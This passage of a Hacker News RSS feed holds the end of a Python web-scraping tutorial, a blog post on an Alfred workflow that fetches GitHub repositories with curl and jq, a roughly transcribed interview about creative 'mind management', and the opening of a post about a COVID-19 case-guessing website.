      <a href="https://www.ahmedbesbes.com/static/c68ac8be504552b4e8a8910a9aa9808f/a8200/posts.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="the posts on the home page" title="the posts on the home page" src="https://www.ahmedbesbes.com/static/c68ac8be504552b4e8a8910a9aa9808f/b9e4f/posts.png" srcset="https://www.ahmedbesbes.com/static/c68ac8be504552b4e8a8910a9aa9808f/cf440/posts.png 148w,
https://www.ahmedbesbes.com/static/c68ac8be504552b4e8a8910a9aa9808f/d2d38/posts.png 295w,
https://www.ahmedbesbes.com/static/c68ac8be504552b4e8a8910a9aa9808f/b9e4f/posts.png 590w,
https://www.ahmedbesbes.com/static/c68ac8be504552b4e8a8910a9aa9808f/a8200/posts.png 700w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>the posts on the home page</figcaption>
  </figure>
<p>we’ll see that each of the ten posts appearing in the grid is inside a div of class <strong>“post-style1 col-md-6”</strong> which is
itself inside a <strong>section</strong> of class <strong>“content”</strong>.</p>
<p>Extracting posts per page is therefore quite easy:</p>
<div data-language="python"><pre><code>url <span>=</span> <span>"https://www.premiumbeautynews.com/fr/marches-tendances/"</span>
soup <span>=</span> parse_url<span>(</span>url<span>)</span>
section <span>=</span> soup<span>.</span>find<span>(</span><span>"section"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"content"</span><span>}</span><span>)</span>
posts <span>=</span> section<span>.</span>findAll<span>(</span><span>"div"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"post-style1 col-md-6"</span><span>}</span><span>)</span></code></pre></div>
<p>Then, for each individual post, we can extract the URL which appears inside an <strong>“a tag”</strong> that is itself inside an
<strong>h4</strong>. We’ll use this URL to call our previously defined function <strong>extract<em>post</em>data</strong>.</p>
<div data-language="python"><pre><code>uri <span>=</span> post<span>.</span>find<span>(</span><span>"h4"</span><span>)</span><span>.</span>find<span>(</span><span>"a"</span><span>)</span><span>[</span><span>"href"</span><span>]</span></code></pre></div>
<h4 id="Paginating"><a href="#Paginating" aria-label="Paginating permalink"></a>Paginating</h4>
<p>Once the posts are extracted on a given page, you may want to go to the next page and repeat the same operation.</p>
<p>If you look at the pagination, you’ll notice a “next button”:</p>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/40c0c97d51ffade267a82984590006ba/f1dec/pagination.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="pagination" title="pagination" src="https://www.ahmedbesbes.com/static/40c0c97d51ffade267a82984590006ba/b9e4f/pagination.png" srcset="https://www.ahmedbesbes.com/static/40c0c97d51ffade267a82984590006ba/cf440/pagination.png 148w,
https://www.ahmedbesbes.com/static/40c0c97d51ffade267a82984590006ba/d2d38/pagination.png 295w,
https://www.ahmedbesbes.com/static/40c0c97d51ffade267a82984590006ba/b9e4f/pagination.png 590w,
https://www.ahmedbesbes.com/static/40c0c97d51ffade267a82984590006ba/f1dec/pagination.png 608w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>pagination</figcaption>
  </figure>
<p>This button becomes inactive once you reach the last page. Put differently, while the next button is active, you have to
tell the scraper to grab the posts of the current page, move to the next page and repeat the operation. When the button
becomes inactive, the process should stop.</p>
<p>Wrapping up this logic, this translates into the following code:</p>
<div data-language="python"><pre><code>next_button <span>=</span> <span>""</span>
posts_data <span>=</span> <span>[</span><span>]</span>
count <span>=</span> <span>1</span>
base_url <span>=</span> <span>'https://www.premiumbeautynews.com/'</span>

<span>while</span> next_button <span>is</span> <span>not</span> <span>None</span><span>:</span>
    <span>print</span><span>(</span><span><span>f"page number : </span><span><span>{</span>count<span>}</span></span><span>"</span></span><span>)</span>

    soup <span>=</span> parse_url<span>(</span>url<span>)</span>
    section <span>=</span> soup<span>.</span>find<span>(</span><span>"section"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"content"</span><span>}</span><span>)</span>
    posts <span>=</span> section<span>.</span>findAll<span>(</span><span>"div"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"post-style1 col-md-6"</span><span>}</span><span>)</span>

    <span>for</span> post <span>in</span> tqdm_notebook<span>(</span>posts<span>,</span> leave<span>=</span><span>False</span><span>)</span><span>:</span>
        uri <span>=</span> post<span>.</span>find<span>(</span><span>"h4"</span><span>)</span><span>.</span>find<span>(</span><span>"a"</span><span>)</span><span>[</span><span>"href"</span><span>]</span>
        post_url <span>=</span> base_url <span>+</span> uri
        data <span>=</span> extract_post_data<span>(</span>post_url<span>)</span>
        posts_data<span>.</span>append<span>(</span>data<span>)</span>

    next_button <span>=</span> soup<span>.</span>find<span>(</span><span>"p"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"pagination"</span><span>}</span><span>)</span><span>.</span>find<span>(</span><span>"span"</span><span>,</span> <span>{</span><span>"class"</span><span>:</span> <span>"next"</span><span>}</span><span>)</span>
    <span>if</span> next_button <span>is</span> <span>not</span> <span>None</span><span>:</span>
        url <span>=</span> base_url <span>+</span> next_button<span>.</span>find<span>(</span><span>"a"</span><span>)</span><span>[</span><span>"href"</span><span>]</span>
        count <span>+=</span> <span>1</span></code></pre></div>
<p>Once this loop completes, you’ll have all the data inside posts_data, which you can turn it into a beautiful dataframe
and export to CSV or Excel file.</p>
<div data-language="python"><pre><code>df <span>=</span> pd<span>.</span>DataFrame<span>(</span>posts_data<span>)</span>
df<span>.</span>head<span>(</span><span>)</span></code></pre></div>
<figure>
    <span>
      <a href="https://www.ahmedbesbes.com/static/18c1607d3c11bbb201e37ec88fdd4e23/a8200/dataframe.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="dataframe" title="dataframe" src="https://www.ahmedbesbes.com/static/18c1607d3c11bbb201e37ec88fdd4e23/b9e4f/dataframe.png" srcset="https://www.ahmedbesbes.com/static/18c1607d3c11bbb201e37ec88fdd4e23/cf440/dataframe.png 148w,
https://www.ahmedbesbes.com/static/18c1607d3c11bbb201e37ec88fdd4e23/d2d38/dataframe.png 295w,
https://www.ahmedbesbes.com/static/18c1607d3c11bbb201e37ec88fdd4e23/b9e4f/dataframe.png 590w,
https://www.ahmedbesbes.com/static/18c1607d3c11bbb201e37ec88fdd4e23/a8200/dataframe.png 700w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span>
    <figcaption>dataframe</figcaption>
  </figure>
<p>Thanks for reading for staying till the end! If you’re interested in the video recording of this tutorial, here is the
link:</p>
<h3 id="Where-to-go-from-here"><a href="#Where-to-go-from-here" aria-label="Where to go from here permalink"></a>Where to go from here?</h3>
<p>You just learned how to build your first scraper, congratulations!</p>
<p>Now if you want to improve it you may think about these next steps:</p>
<ul>
<li>Multiprocessing and multithreading the execution of the script</li>
<li>Scheduling the run of the scraper over periods of time, to automate data scraping</li>
<li>Handle error — scrapers are hard to maintain over time because the source code may change</li>
<li>Deploy a database or an s3 bucket to store the scraped items</li>
</ul>
<p>This may get you busy for a while! Happy data scraping!</p></article></section><section></section></section></section></div></div>]]>
            </description>
            <link>https://www.ahmedbesbes.com/case-studies/introduction-to-scraping</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026820</guid>
            <pubDate>Sun, 08 Nov 2020 16:32:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Alfred to open your GitHub repositories in the browser]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25026757">thread link</a>) | @mmazzarolo
<br/>
November 8, 2020 | https://mmazzarolo.com/blog/2020-09-28-alfred-github-repos/ | <a href="https://web.archive.org/web/*/https://mmazzarolo.com/blog/2020-09-28-alfred-github-repos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>One thing I do multiple times a day is browsing my company’s GitHub organization repositories.<br>
My process for opening these repositories in the browser is:</p>
<ul>
<li>Open Chrome</li>
<li>Press <kbd>Command</kbd> + <kbd>L</kbd> to focus the address bar</li>
<li>Start typing the GitHub repository name</li>
<li>Look for the page suggestion and click on it</li>
</ul>
<p>This flow works well for repositories that I have starred as bookmarks or that I browsed recently…<br>
…But because I’m a total sucker for Alfred, today I wasted almost an hour moving this process into an Alfred workflow.</p>
<p><span>
      <span></span>
  <img alt="alfred" title="alfred" src="https://mmazzarolo.com/static/f6b79b275f646159f864ae32c3d83508/fcda8/alfred.png" srcset="https://mmazzarolo.com/static/f6b79b275f646159f864ae32c3d83508/12f09/alfred.png 148w,
https://mmazzarolo.com/static/f6b79b275f646159f864ae32c3d83508/e4a3f/alfred.png 295w,
https://mmazzarolo.com/static/f6b79b275f646159f864ae32c3d83508/fcda8/alfred.png 590w,
https://mmazzarolo.com/static/f6b79b275f646159f864ae32c3d83508/efc66/alfred.png 885w,
https://mmazzarolo.com/static/f6b79b275f646159f864ae32c3d83508/c83ae/alfred.png 1180w,
https://mmazzarolo.com/static/f6b79b275f646159f864ae32c3d83508/7ef4c/alfred.png 1748w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<h2>The Action Plan</h2>
<p>Knowing that:</p>
<ul>
<li>The entire repository list is huge and doesn’t change often</li>
<li>I wanted the Alfred repository search result to be instant</li>
</ul>
<p>Making an API request to filter the repositories each time I invoke the Alfred workflow wasn’t an option.</p>
<p>So I decided to 1) download the entire repository list into a JSON file, 2) transform it into an Alred-compatible format, and 3) use the <a href="https://github.com/deanishe/alfred-fuzzy" target="_blank" rel="nofollow noopener noreferrer">Alfred’s fuzzy search helper</a> to filter the results.</p>
<h2>Creating the GitHub repository list</h2>
<p>First of all, I <a href="https://github.com/settings/tokens/new" target="_blank" rel="nofollow noopener noreferrer">created a GitHub API token with a scope to access the repositories list</a>.</p>
<p><span>
      <span></span>
  <img alt="github repo access" title="github repo access" src="https://mmazzarolo.com/static/5debf06855fa8eef2379c163d8d95943/fcda8/github-repo-access.png" srcset="https://mmazzarolo.com/static/5debf06855fa8eef2379c163d8d95943/12f09/github-repo-access.png 148w,
https://mmazzarolo.com/static/5debf06855fa8eef2379c163d8d95943/e4a3f/github-repo-access.png 295w,
https://mmazzarolo.com/static/5debf06855fa8eef2379c163d8d95943/fcda8/github-repo-access.png 590w,
https://mmazzarolo.com/static/5debf06855fa8eef2379c163d8d95943/efc66/github-repo-access.png 885w,
https://mmazzarolo.com/static/5debf06855fa8eef2379c163d8d95943/69476/github-repo-access.png 926w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<blockquote>
<p>TIL: Selecting all the “repo” sub-scopes is not the same as selecting the entire scope — which is needed to use the API token to get the list of all the private repositories.</p>
</blockquote>
<p>The GitHub API pagination has a limit of 200 items per page. I needed to fetch way more than 200 repositories, so I modified <a href="https://gist.github.com/mbohun/b161521b2440b9f08b59" target="_blank" rel="nofollow noopener noreferrer">this cool (but outdated) bash script</a> to fetch all of them in a single command and print them out to the console:</p>
<div data-language="bash"><pre><code><span>#!/bin/bash</span>

<span>if</span> <span>[</span> <span>${<span>#</span>@}</span> -lt <span>2</span> <span>]</span><span>;</span> <span>then</span>
    <span>echo</span> <span>"usage: <span>$0</span> [your github credentials as 'user:token'] [REST expression]"</span>
    <span>exit</span> <span>1</span><span>;</span>
<span>fi</span>

<span>GITHUB_CREDENTIALS</span><span>=</span><span>$1</span>
<span>GITHUB_API_REST</span><span>=</span><span>$2</span>

<span>GITHUB_API_HEADER_ACCEPT</span><span>=</span><span>"Accept: application/vnd.github.v3+json"</span>

<span>temp</span><span>=</span><span><span>`</span><span>basename</span> $0<span>`</span></span>
<span>TMPFILE</span><span>=</span><span><span>`</span>mktemp /tmp/$<span>{</span>temp<span>}</span>.XXXXXX<span>`</span></span> <span>||</span> <span>exit</span> <span>1</span>

<span>function</span> <span>rest_call</span> <span>{</span>
    <span>curl</span> -s -u <span>$GITHUB_CREDENTIALS</span> <span>$1</span> -H <span>"<span>${GITHUB_API_HEADER_ACCEPT}</span>"</span> <span>&gt;&gt;</span> <span>$TMPFILE</span>
<span>}</span>


<span>last_page</span><span>=</span><span><span>`</span><span>curl</span> -s -I -u $GITHUB_CREDENTIALS <span>"https://api.github.com<span>${GITHUB_API_REST}</span>?per_page=200"</span> -H <span>"<span>${GITHUB_API_HEADER_ACCEPT}</span>"</span> <span>|</span> <span>grep</span> <span>'^Link:'</span> <span>|</span> <span>sed</span> -e <span>'s/^Link:.*page=//g'</span> -e <span>'s/&gt;.*$//g'</span><span>`</span></span>


<span>if</span> <span>[</span> -z <span>"<span>$last_page</span>"</span> <span>]</span><span>;</span> <span>then</span>
    
    rest_call <span>"https://api.github.com<span>${GITHUB_API_REST}</span>?per_page=200"</span>
<span>else</span>
    
    <span>for</span> <span>p</span> <span>in</span> <span><span>`</span><span>seq</span> <span>1</span> $last_page<span>`</span></span><span>;</span> <span>do</span>
        rest_call <span>"https://api.github.com<span>${GITHUB_API_REST}</span>?per_page=200&amp;page=<span>$p</span>"</span>
    <span>done</span>
<span>fi</span>

<span>cat</span> <span>$TMPFILE</span></code></pre></div>
<p>I named the script <code>githubapi-get.sh</code> and used it this way:</p>
<div data-language="bash"><pre><code>
githubapi-get.sh <span>"{USERNAME}:{TOKEN}"</span> <span>"/orgs/{ORGANIZATION}/repos"</span> <span>&gt;</span> ~/my-company-repos.txt</code></pre></div>
<p>FYI, you can also run it this way to get all the repositories you have access to (both on your personal account and on other organization accounts):</p>
<div data-language="bash"><pre><code>
githubapi-get.sh <span>"{USERNAME}:{TOKEN}"</span> <span>"/user/repos"</span> <span>&gt;</span> ~/my-github-repos.txt</code></pre></div>
<h2>Making the repository list compatible with Alfred</h2>
<p>To populate the Alfred list filter, for each repo I extracted the following information:</p>
<ul>
<li><code>uid</code>: Unique identifier for the item which allows Alfred to learn about this item for subsequent sorting and ordering of the user’s actioned results. I used the repository ID (<code>id</code>).</li>
<li><code>arg</code>: The argument which is passed through the workflow to open it in the browser. I used the repository URL (<code>html_url</code>).</li>
<li><code>title</code>: The title displayed in the result row. I used the repository name (<code>name</code>).</li>
<li><code>subtitle</code>: The subtitle displayed in the result row. I used the repository description (<code>description</code>).</li>
</ul>
<p>Using the following <code>jq</code> script:</p>
<div data-language="bash"><pre><code><span>cat</span> ~/my-company-repos.txt <span>|</span> jq -s <span>'.[] | map({ arg: .html_url, uid: .id, title: .name, subtitle: .description }) | { items: . }'</span> <span>&gt;</span> ~/my-company-repos.json</code></pre></div>
<p>The <code>jq</code> script generates a <code>~/my-company-repos.json</code> file compatible with the <a href="https://www.alfredapp.com/help/workflows/inputs/script-filter/json/" target="_blank" rel="nofollow noopener noreferrer">Alfred Script Filter JSON format</a>.</p>
<h2>Creating the Alfred workflow</h2>
<p>The Alfred standard script filtering doesn’t have a good fuzzy search option — which I really wanted given the huge amount of repositories.</p>
<p>As a workaround, I used <a href="https://github.com/deanishe/alfred-fuzzy" target="_blank" rel="nofollow noopener noreferrer">alfred-fuzzy</a>, a Python helper script for Alfred that replaces the “Alfred filters results” option with fuzzy search.</p>
<p>Here’s what I did, step by step:</p>
<ol>
<li>Create a new empty Alfred workflow</li>
<li>Right-click on the created workflow ⭢ “Open in Finder”</li>
<li>In the workflow directory, copy and paste both <a href="https://raw.githubusercontent.com/deanishe/alfred-fuzzy/master/fuzzy.py" target="_blank" rel="nofollow noopener noreferrer">fuzzy.py</a> and <code>my-company-repos.json</code>.</li>
<li>In the workflow, create the following “Script Filter”:
<span>
      <span></span>
  <img alt="workflow 0" title="workflow 0" src="https://mmazzarolo.com/static/79ea20fa5f1577ca4cb07a0fd9329861/fcda8/workflow-0.png" srcset="https://mmazzarolo.com/static/79ea20fa5f1577ca4cb07a0fd9329861/12f09/workflow-0.png 148w,
https://mmazzarolo.com/static/79ea20fa5f1577ca4cb07a0fd9329861/e4a3f/workflow-0.png 295w,
https://mmazzarolo.com/static/79ea20fa5f1577ca4cb07a0fd9329861/fcda8/workflow-0.png 590w,
https://mmazzarolo.com/static/79ea20fa5f1577ca4cb07a0fd9329861/efc66/workflow-0.png 885w,
https://mmazzarolo.com/static/79ea20fa5f1577ca4cb07a0fd9329861/c83ae/workflow-0.png 1180w,
https://mmazzarolo.com/static/79ea20fa5f1577ca4cb07a0fd9329861/2b608/workflow-0.png 1540w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></li>
<li>In the workflow, create the following “Open URL” action:
<span>
      <span></span>
  <img alt="workflow 1" title="workflow 1" src="https://mmazzarolo.com/static/5f157cd5f9d5e2e8f928074cc6d37708/fcda8/workflow-1.png" srcset="https://mmazzarolo.com/static/5f157cd5f9d5e2e8f928074cc6d37708/12f09/workflow-1.png 148w,
https://mmazzarolo.com/static/5f157cd5f9d5e2e8f928074cc6d37708/e4a3f/workflow-1.png 295w,
https://mmazzarolo.com/static/5f157cd5f9d5e2e8f928074cc6d37708/fcda8/workflow-1.png 590w,
https://mmazzarolo.com/static/5f157cd5f9d5e2e8f928074cc6d37708/efc66/workflow-1.png 885w,
https://mmazzarolo.com/static/5f157cd5f9d5e2e8f928074cc6d37708/c83ae/workflow-1.png 1180w,
https://mmazzarolo.com/static/5f157cd5f9d5e2e8f928074cc6d37708/7960f/workflow-1.png 1274w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></li>
<li>In the workflow, connect the “Script Filter” to the “Open URL” action:
<span>
      <span></span>
  <img alt="workflow 2" title="workflow 2" src="https://mmazzarolo.com/static/ca9a91ea4b4aed993050fc92f0780f4d/fcda8/workflow-2.png" srcset="https://mmazzarolo.com/static/ca9a91ea4b4aed993050fc92f0780f4d/12f09/workflow-2.png 148w,
https://mmazzarolo.com/static/ca9a91ea4b4aed993050fc92f0780f4d/e4a3f/workflow-2.png 295w,
https://mmazzarolo.com/static/ca9a91ea4b4aed993050fc92f0780f4d/fcda8/workflow-2.png 590w,
https://mmazzarolo.com/static/ca9a91ea4b4aed993050fc92f0780f4d/8ae3e/workflow-2.png 756w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></li>
</ol>
<p>That’s it.
I can now invoke the workflow using the keyword set in the “Script Filter” action and fuzzy search the repo I’m interested in.</p>
<p>Alfred is also smart enough to keep track of my workflow usage, surfacing the most clicked results to the top of the list 💥</p>
<blockquote>
<p>Yes, the workflow can be improved in several ways (e.g.: auto-update the repository list after n days)… but I’m happy enough with the current result for now.</p>
</blockquote></section></div>]]>
            </description>
            <link>https://mmazzarolo.com/blog/2020-09-28-alfred-github-repos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026757</guid>
            <pubDate>Sun, 08 Nov 2020 16:24:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mind Management, Not Time Management Interview]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026678">thread link</a>) | @ozres1
<br/>
November 8, 2020 | https://ruizhidong.com/writing-routines-daily-rituals-productivity-and-generating-creative-insights-with-david-kadavy/ | <a href="https://web.archive.org/web/*/https://ruizhidong.com/writing-routines-daily-rituals-productivity-and-generating-creative-insights-with-david-kadavy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="content" role="main"><div id="post-separate" class="page">
<figure><p><span><iframe width="900" height="507" src="https://www.youtube.com/embed/VswNjU3G-ZU?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-US&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p></figure><p>I talk to David Kadavy about his new book, <a href="https://amzn.to/354K48w" target="_blank" rel="noopener">Mind Management, Not Time Management</a>.</p><p>David is an author, podcaster, and self-publishing coach. He believes one of the biggest challenges we face in the age of AI is the ability for humans to tap into their innate creativity.</p><p>In this conversation, we talk about structuring the four stages of creativity according to your mental state, how to generate creative insights and ideas, note-taking and creating an ideal working environment, especially for those that are currently working from home.</p><p><strong>Find David online: </strong></p><p><a href="https://kadavy.net/" target="_blank" rel="noopener">David’s Blog</a><br><a href="https://twitter.com/kadavy" target="_blank" rel="noopener">Twitter</a></p><p><strong>Books Mentioned:</strong></p><p><a href="https://amzn.to/3k5NR9N" target="_blank" rel="noopener">Getting Things Done<br></a><a href="https://amzn.to/3k5qrBh" target="_blank" rel="noopener">Black Swan</a><br><a href="https://amzn.to/32lo2g3" target="_blank" rel="noopener">Understanding Media</a></p><p><strong>Further Resources:</strong></p><p>0:12<br>So, what got you started on writing this book about mind management?</p><p>0:19<br>Yeah, the new book is my management, not time management. And the way that I got started on was writing my first book, about 10 years ago, almost exactly, I got a book deal to write my first book. I was not a writer, I hated writing as a kid did not think of myself as a writer. But I’d written some blog posts, and got a book deal.</p><p>0:45<br>And I</p><p>0:47<br>quickly realized that nothing that I had learned about productivity, had prepared me to write a book, I had been a productivity enthusiast, I love to getting things done, and was always trying different tools. But when it came time to write a book, I realized it was just banging my head against the wall for 12 hours a day. And just to get like, 15 minutes of writing that that came easily. And, you know, I tried to clear away my whole schedule, I fired clients, I kind of a lot of my social life, I outsource things, you know, my meal preparation, household chores, cleaning the house, all this stuff. I just cleared out my whole schedule. And I just still couldn’t really get the book, yet it progress going on the book. And I even had a friend say, you just look at the data on your contract and break it down. It was like 250 words a day. Okay, cool. I put that on the calendar and everything. No, it doesn’t work that way. You can’t just like, sit down and write 250 words a day, you have to have the thoughts behind those 250 words, first, you have to like get that all organized. And I did suffer through writing that book. But when the smoke cleared on that process, I wanted to figure out how I had managed to accomplish this, I had started to develop patterns and routines to make that sort of moment of flow happen to make those insights happen. And I started to dig into the neuroscience and the psychology of creativity. And I started to see patterns there. And so I wrote a blog post in 2012, called mind management, not time management. And that prompted Dan Ariely, the behavioral scientist to reach out to me and he was working on an app called timeful. And we collaborated on that app, I was the design advisor to the team, helping them integrate sort of a mind management philosophy into that app. And then an app sold to Google. And I all along been experimenting. I’ve even redesigned my entire life around my creative output. I moved to Columbia five years ago, where I now live. And so during all that time, I’ve really been trying to tweak this system to have a consistent way to manage creative energy toward having those moments where you have the ideas come easily to you. And so I think I’ve I think I’ve got it. So the book just came out. And I have like a far more healthy approach to creativity now, thanks to the things that I’ve learned.</p><p>3:52<br>Or how do you think the being creative engine has helped you? And what about creativity is so important in today’s world?</p><p>4:06<br>Well, I mean, as far as right helping me, I think that I had sort of settled into unhealthy patterns of getting creative work done, I wanted to create my own thing. But I it just became, it just became very unsustainable, which is working around the clock, damaging relationships, of just being obsessed with trying to create things and trying to deal with the day to day world along the way. And so being able to have the confidence that I have a system to manage the energy to manage my project, so they go forward consistently, is just great for my mental health in general, because Take, for example, something like writing that book, it was just, it was just this huge single to do item that was never done. And I didn’t know or have a confidence that I would arrive at the point where I would get it done. But now I have a better perspective of how the creative process works, how my energy works, along with that creative process, how the cycles in the world are there that you can harness to propel your creative projects forward. And so it’s just day to day a lot more relaxing, to be me than it was before. And I think that my work improves as a result of it. Now, as far as why creativity is so important, this wasn’t the reason that I became a creator. But, you know, in this age of AI, where if you can teach a human how to do something, or you can automate it, or you can outsource it, and it will soon be automated, you know, Kai Fuli, who I was, who was a AI expert, work for Google projected 40 to 50% of jobs being replaced by AI in the next 10 to 20 years or so. And a lot of people think it is kind of scary, in a lot of people think that is scary. And you know, there’s a whole other conversation about whether that should happen. But it’s happening there, it appears to be happening. And it’s actually very freeing for us as humans because it means that well now we can go back to being creative. And in fact, if you want to have an edge as a human, you need to be creative. So you can sit down and you can type in 50,000 nonsense words in a day or so. And but you your computer could generate 50,000 nonsense words in you know, instantly fashion you could blink. So you know what the where the value is in is in writing that novel or 50 the thoughts behind the words not in the words themselves?</p><p>7:23<br>Have you seen the stuff on GPT three, and they they’ve produced content that has apparently like full people? Well, some of the some of the content produced by GPT three ranks like on the top page on the first page of Hacker News.</p><p>7:40<br>Yeah, I haven’t seen that level of GPG three I have seen some experiments from sage and l Shane who is messing around with, with ay ay ay. Ay ay ay ay weirdness, calm and, and it was, you know, it was not that impressive, actually, like, how many how many eyes does a horse have? And it just like kept saying for? Like, I don’t know, I think that who knows, I guess I could be wrong like the way that some people were writing and cranking out formulaic say, mystery novels or something I could see AI doing that at some point, but I think there’s always going to be a place for becoming you because there’s only one you and and, and finding a way to present that to the world. So I could be wrong. But I defer to Kai Fuli on this, he doesn’t seem to think that that’s gonna be happening</p><p>8:40<br>terribly soon, if ever.</p><p>8:45<br>So I think that, I guess that</p><p>8:50<br>in terms of the the last thing to be automated by AI would be harnessing that creativity. A lot of the followers on, on this, on this channel are into, into writing and note taking, how do you think that? What What’s something that? How do you think they can benefit from changing, changing their perspective on focusing only on, you know, being busy and focusing on like managing the time and getting as much as possible out of time, as opposed to focusing on mind management and on creative energy management?</p><p>9:37<br>Yeah, so one of the things I’m a note taker, as well, I’ve sort of built my own little zettelkasten. And I think one of the things that makes it work is a lot of the similar to what I’ve found in writing this book, which is that you don’t arrive at great insights or you don’t arrive at learning All at once, you know, taking notes makes, it just reduces the cognitive load for thinking about, say, what is this book about you just like write one little note, another note, another note, another note. And then eventually, you can connect those things. And, you know, make a summary or you can check for new project ideas from different places and make new ideas. But this is kind of like one of the things that I’ve discovered. In dissecting creativity, there is this sort of framework for understanding the stages of creativity, I’m calling it in the book, the four stages of creativity is based upon a speech by a German scientists from the late 1800s, which was then picked up by a guy named Herman Bell, von Helmholtz. And then there was a social scientist named Graham Wallace, who called the four stages of control, and which I just adapted to the four stages of creativity, and their prep your preparation, incubation, illumination, and verification. So preparation is the collecting of information. incubation is the sort of pulling away from the problem space. And there’s all sorts of subconscious incubation, that happens, that makes things easier to later Connect for new ideas. illumination is that moment of having an insight. And then verification is preparing something to verify that it’s ready to be shipped or that it actually is a valid idea. And so this is something that happens when you’re you’re taking notes, as you’re doing the preparation, you’re just collecting these short, little notes. And that is, as you’re doing that you’re exercising those connections in your mind. And so as you sleep, or as you do other things, your brain is sort of testing out connections, it’s any sort of bad dead end connections that you came up with along the way. Are, those are falling away, it’s a it’s called fixation forgetting. And then later on, when you do sit down to say, write the summary of the book that you just took a bunch of notes on it, suddenly, it’s way, way easier. Because that stuff has sunk into your mind. We very easily forget, when we sit down and say, Oh, I’m gonna try to write a summary of this book, or I’m gonna try to write an article or a blog post. And …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ruizhidong.com/writing-routines-daily-rituals-productivity-and-generating-creative-insights-with-david-kadavy/">https://ruizhidong.com/writing-routines-daily-rituals-productivity-and-generating-creative-insights-with-david-kadavy/</a></em></p>]]>
            </description>
            <link>https://ruizhidong.com/writing-routines-daily-rituals-productivity-and-generating-creative-insights-with-david-kadavy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026678</guid>
            <pubDate>Sun, 08 Nov 2020 16:14:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I made a website to guess tomorrow’s Covid-19 case count]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25026666">thread link</a>) | @nathell
<br/>
November 8, 2020 | http://blog.danieljanus.pl/2020/11/08/coronalotto/ | <a href="https://web.archive.org/web/*/http://blog.danieljanus.pl/2020/11/08/coronalotto/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Before</h2><p>It seems so obvious in hindsight. Here in Poland, people have been guessing it ever since the pandemic breakout: in private conversations, in random threads on social media, in comments under governmental information outlets. It seemed a&nbsp;matter of time before someone came up with something like this. In fact, on one Sunday evening in October, I&nbsp;found myself flabbergasted that apparently no one yet has.</p><p>I&nbsp;doled out $4 for a&nbsp;domain, <a href="http://koronalotek.pl/">koronalotek.pl</a> (can be translated as “coronalotto” or “coronalottery” – occurrences of the name on Twitter date back at least as far as April), and fired up a&nbsp;REPL. A&nbsp;few hours and 250 Clojure LOCs later, the site was up.</p><p>I&nbsp;wanted it to&nbsp;be as simple as possible. A&nbsp;form with two fields: “your name” and “how many cases tomorrow?” A&nbsp;top-ten list of today’s winners, sorted by the absolute difference between the guess and the actual number of cases, as <a href="https://twitter.com/mz_gov_pl">reported daily on Twitter</a> by the Polish Ministry of Health. The official number, prominently displayed. And that’s all.</p><p><img src="http://blog.danieljanus.pl/img/blog/koronalotek.png"></p><p>On 17 October, I&nbsp;posted the link on my Facebook and Twitter feeds, and waited. The stream of guesses started to&nbsp;trickle in.</p><h2>After</h2><p>It never grew to&nbsp;be more than a&nbsp;stream, but it hasn’t gone completely unnoticed either.</p><p><img src="http://blog.danieljanus.pl/img/blog/koronalotek-g1.png"></p><p>The above plot shows daily number of accepted guesses (i.e., those that were used to&nbsp;generate the next day’s winners) over time – a&nbsp;metric of popularity. Each day’s number means guesses cast in the 24 hours up until 10:30 (Warsaw time) on that day, which is when the official numbers are published by the Ministry of Health.</p><p>I’ve been filtering out automated submissions, as well as excess manual submissions by the same IP that seemed to&nbsp;skew the results too much – I’ve arbitrarily set the “excess” threshold at 10. The missing datapoint for 19 October is not a&nbsp;zero, but a&nbsp;N/A: I’ve lost that datapoint due to&nbsp;a&nbsp;glitch. More on this below.</p><p>The interest peaked on October 23, with more than a&nbsp;thousand guesses for that day (I&nbsp;think it was reposted by someone with a&nbsp;significant outreach back then), and has been slowly declining since.</p><p>I&nbsp;have privately received some feedback. One person has pointed out that they found the site distasteful and that making fun of pandemic tragedies made them uncomfortable. (I&nbsp;empathise; for me it’s not so much making fun as it is a&nbsp;coping mechanism—a&nbsp;way to&nbsp;put distance between my thoughts and the difficult times we’re in and to&nbsp;keep fears at bay.) Some people, however, have thanked me for making them smile when they guessed more or less correctly.</p><p>Back to&nbsp;data. Being a&nbsp;data junkie, I&nbsp;looked at what I&nbsp;had been collecting. First things first: how accurate is the collective predictive power of the 